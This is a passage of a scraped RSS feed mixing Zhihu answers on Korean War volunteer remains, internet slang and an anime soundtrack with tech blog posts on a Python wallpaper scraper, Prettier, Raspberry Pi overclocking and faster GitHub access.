data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>这一切都在告诉我们，告诉中国的孩子，如今山河无恙是先辈用生命换来的。</b></p>\n<p><b>总有人正在年轻，而今的中国，要看我们了。</b></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yihao-shao-wei-11?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一号哨位</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484341681/answer/2100338292?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">366 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/452226885?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">身边认识的人家中曾经出过烈士和英雄是一种怎样的体验？他们曾经有哪些感人的事迹或故事？</a><br><a href=\"http://www.zhihu.com/question/482921104?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？</a><br>\n","link":"http://www.zhihu.com/question/484341681/answer/2100338292?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"70多年前，奔向鸭绿江的他们正年轻，关于他们你知道哪些舍生忘死的故事？","date":"2021-09-02 15:05:42","description":"\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-hua-she-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新华社</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483039319/answer/2097015111?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20841303?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果朝韩再发生一次战争，你愿意去当抗美援朝的志愿军吗?</a><br><a href=\"http://www.zhihu.com/question/31387813?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">军事演习真的能反映出战场上可能出现的问题吗？</a><br>\n","link":"http://www.zhihu.com/question/483039319/answer/2097015111?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？","date":"2021-09-02 09:04:34","description":"\n<p>【迎英雄回家！ 109 位在韩志愿军遗骸今日归国】 9 月 2 日，韩方向中方移交 109 位在韩中国人民志愿军烈士的遗骸及 1226 件相关遗物，即将返回祖国。 2014 年起，韩方已八次向中国移交中国人民志愿军烈士遗骸及遗物。截至 2020 年，已有 716 名在韩中国人民志愿军烈士遗骸回国安葬。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zheng-guan-shi-pin-38?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">正观视频</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482921104/answer/2098975134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">788 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/483083790?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">第八批在韩中国人民志愿军烈士遗骸即将回国，送英雄回家，帮烈士寻亲，你有什么线索或建议吗？</a><br><a href=\"http://www.zhihu.com/question/422506524?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 月 27 日中韩将交接第七批中国人民志愿军烈士遗骸，你有什么想对英雄说的？</a><br>\n","link":"http://www.zhihu.com/question/482921104/answer/2098975134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"媒体批「yyds」「绝绝子」等网络用语，称人们离开「梗」就不会说话了，网络用语真的会影响表达能力吗？","date":"2021-09-02 07:47:44","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1416780905449480193\">年轻人聊天为什么动不动就yyds？</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-jing-bao-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新京报</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484057801/answer/2098911638?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2801 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/435750149?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待中国青年报批「做题家」？</a><br><a href=\"http://www.zhihu.com/question/266122357?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">图片上的文字是啥意思？</a><br>\n","link":"http://www.zhihu.com/question/484057801/answer/2098911638?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"《魔道祖师》动画配乐数量达 100 首，有哪些令你记忆深刻？","date":"2021-09-02 06:43:34","description":"\n<p>配乐是影视动画作品制作中重要的组成部分，它可以从听觉上辅助我们观影过程中的情绪感知，起到烘托剧情的作用。《魔道祖师》动画系列作品的配乐部分，初略统计了一下，大约有400首以上、超过500分钟的配乐时长。在整个动画配乐创作上，我们所追求的，是对传统乐器音色的还原保留，对不同剧情的针对性定制烘托，以及对我国各种传统乐曲的融合尝试。更何况作品中的主角，本身就多以乐器作为武器，这对我们在影片配乐上的制作要求提出了更多的、更加精益求精的需求。我们片中一段配乐往往要通过多次反复创作迭代，不断尝试出最佳的状态效果。</p>\n<p>举个例子，我们在创作第一集片尾中主角蓝忘机出场桥段的音乐时，最开始的思路着重于，用古风配乐烘托出这个角色仙气飘飘的特点，让他有一种天然自带BGM的感觉。后来在和画面配合起来后，我觉得还不够，在和音乐总监反复磨合之后，我们发现了一种更加优化的配乐方式，我们尝试使用了角色蓝忘机本身的武器【古琴】这一乐器，创作出一段以古琴作为核心乐器的配乐，古琴音域宽广、音色深沉、余音悠远的特点加入到音乐之中，让雅正端方的“含光君”这个角色一下就立体丰满了。</p>\n<p>在《魔道祖师》动画整体配乐的创作过程中，我和音乐总监确实花了不少心思，下面就简单聊聊几个我觉得还比较有意思的点，和大家分享分享：</p>\n<p><b>1、中国传统乐器声音实录</b></p>\n<p>其实在这部作品里，我们花了大量的工作用在传统乐器声音实录这一部分。我们所有的琴、笛、琵琶、扬琴、瑟等等传统乐器，基本都是通过实录的方式来完成，一路下来，每一集的音乐制作量确实不小。拿28集中魏无羡、蓝忘机和蓝曦臣三个人一起压制赤锋尊这段来说，分别用上了三位角色的“御用乐器”——笛子、古琴和箫，整段以MIDI音乐打底，采用中国传统乐器实录的方式进行混制，乐器声音实录出来的音频效果，既能呼应角色本身的常用武器(乐器)，又能更好营造出清冽悠远的古风意境。出来的效果我还比较满意，和我们的画面很融。其实像这样运用传统乐器特色来烘托剧情场景的地方还有不少，比如描述魏无羡和江澄兄弟之情时，用笛子演奏主题歌《醉梦前尘》的旋律变奏；在蓝曦臣为魏婴讲述父母过往时，使用笛子、二胡来表现曦臣忘机父母故事的曲折和悲伤；在温宁在温情墓前的那场戏，使用了笛子表现温室射日之征后的落魄和人丁凋零；等等。</p>\n<p><b>2、契合剧情 表达效果最大化</b></p>\n<p>把握好配乐使用的分寸，是我对作品配乐的核心要求。不会喧宾夺主，又能为影片的整体化服务，在带入观众情绪的同时，又要有足够的停顿和留白。我觉得配乐从技术环节的层面上讲，更多的不是技而是术，简单的说，也就是更多在乎的是方法而不是技巧。在音乐老师进行配乐创作之前，我都要求他们必须对整体剧情、人物性格、画面表达有足够的了解，能够配合剧情的配乐才是好配乐。因此这一部分，是我们《魔道祖师》系列动画在音乐追求的核心方向。</p>\n<p>为此，我们采用了电影配乐的制作标准——根据具体情节，创作出相适应的音乐。</p>\n<p>比如我们在“前尘篇”中，夷陵老祖魏无羡首次出场吹奏“鬼笛”陈情的那场戏，我们要求实录的民乐老师在带旋律的同时，技法上强化吹笛颤音的吐音；而魏无羡被献舍归来后，在第二集的剧情中要用随手削出的竹笛吹出曲子，那它就一定要区别于前面那场“陈情”吹出的动听的效果，说白了也就是要技法娴熟、但是不那么好听。最后，我们用一把已经坏了的笛子，把它临时修复一下，乐器本来的音调还不是那么的准确，但是吹奏的技法又非常娴熟，最后实录出来的效果就很贴剧情需要的那个状态了。</p>\n<p>再比如“完结篇”中，我们在设计晓星尘开棺这段配乐时，想要传达给观众的感受主要有两个，一是“好美”，二是“好可惜”。所以我们在配器上，选用了竖琴和弦乐用来铺底，单簧管演奏旋律。竖琴的听感是晶莹剔透的，给人一种冰清玉洁的感受；而在表达舒缓柔和的曲风时，单簧管与弦乐的融合度是非常好的，适合用来烘托晓星尘的角色形象，实现“好美”这部分的诉求。而“好可惜”，更多的则是运用音乐性来讲述，在旋律和和声上实现。比如，我们在小调旋律中加入了变化音#2 #5，完成了配乐从平缓到悲伤的情绪转折，为影片带入后续剧情提供足够的烘托。</p>\n<p>配乐不等同于歌曲创作，理想的配乐应该是观众在记住故事情节的下一步才会注意到音乐，每当音乐响起，画面又能在观众的脑海中重新浮现出来，这就达到了配乐的核心要求。</p>\n<p><b>3、发掘传统音乐的更多面</b></p>\n<p>在《魔道祖师》动画三季配乐制作中，我们也一直在努力挖掘和尝试很多具有新鲜感的配乐。比如“完结篇”中薛洋假扮晓星尘出场时的BGM中，我们加入了中国传统打击乐器，以一个类似于戏曲的感觉，为剧情中薛洋假扮晓星尘提供暗示。我们以传统戏曲为灵感，提取音乐元素融入到薛洋假扮晓星尘出场时的bgm中，比如打击乐镲和锣。作为打击乐，它们音色识别性极强。在演奏时，通常用在节奏的最高点，加强戏剧效果。戏曲是我们的传统艺术，现今很少有人去专门去欣赏和品味，我们希望以类似的融合为契机，能让大家关注到更多的传统音乐。</p>\n<p>整个《魔道祖师》动画系列的配乐，每位主角都有专属的音乐元素增强角色的识别，每段剧情也有相应的配乐旋律烘托整体的氛围。目前完结篇正在更新中，欢迎大家在观看的同时，有时间可以品味一下融合在整体画面中的配乐，希望能带给大家更加立体的观感体验。也再次感谢大家对我们的作品的喜爱与关注。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiong-ge-34-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">敻牁</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483985096/answer/2098783281?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/404241911?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在我应该怎么看《魔道祖师》极其衍生作品?</a><br><a href=\"http://www.zhihu.com/question/402175455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在哪看魔道祖师啊?</a><br>\n","link":"http://www.zhihu.com/question/483985096/answer/2098783281?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img 